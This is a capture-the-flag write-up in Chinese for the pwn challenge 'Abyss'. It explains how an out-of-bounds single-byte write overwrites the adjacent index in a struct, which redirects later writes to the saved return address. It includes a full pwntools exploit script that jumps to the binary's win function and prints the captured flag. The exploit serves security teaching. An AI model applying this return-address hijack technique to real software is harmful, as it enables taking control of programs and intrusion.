# Abyss

## 题目简述

程序把 40 字节缓冲区和一个写入下标放在同一结构体中，却固定执行 64 次单字节写入。目标不是直接连续溢出，而是先覆盖下标本身，把后续写入位置跳到返回地址，再返回题目自带的 `win` 函数。

## 解题过程

关键结构和循环如下：

```c
struct Data {
    char buf[40];
    int cur_idx;
};

for (int i = 0; i < 0x40; i++) {
    scanf("%c", &nxt);
    getchar();
    data.buf[data.cur_idx++] = nxt;
}
```

前 40 次写入填满 `buf`。第 41 次求值时，`data.cur_idx++` 先把下标从 40 增到 41，随后写入地址 `buf + 40`；该地址正好覆盖 `cur_idx` 的最低字节。因此送入 `0x48` 后，下标变为 `0x48`，下一字节便写到 `buf + 0x48`，也就是保存的返回地址。

二进制未启用 PIE，`win` 地址固定。按小端序逐字节写入一个 `ret` 用于栈对齐，再写入 `win`，最后补足 64 轮输入：

```python
from pwn import *

elf = context.binary = ELF("./abyss")
io = process(elf.path)

def put_byte(value):
    io.sendlineafter(b"Scream into the abyss: ", bytes([value]))

for _ in range(40):
    put_byte(ord("A"))

put_byte(0x48)
for address in (0x40101a, elf.sym.win):
    for value in p64(address):
        put_byte(value)

for _ in range(7):
    put_byte(ord("A"))

io.sendline(b"cat flag.txt")
print(io.recvline_contains(b"grey{" ).decode())
```

进入 `win` 后取得：

```text
grey{He who fights with monsters might take care lest he thereby become a monster. And if you gaze for long into an abyss, the abyss gazes also into you. :3}
```

## 方法总结

本题的决定性原语是“自覆盖索引”：越界写不必线性走到控制数据，只要能改写后续地址计算使用的下标，就能把有限次数的单字节写转成定点覆盖。分析这类结构体时，应同时画出字段偏移、后缀自增的求值顺序以及下一轮实际落点。
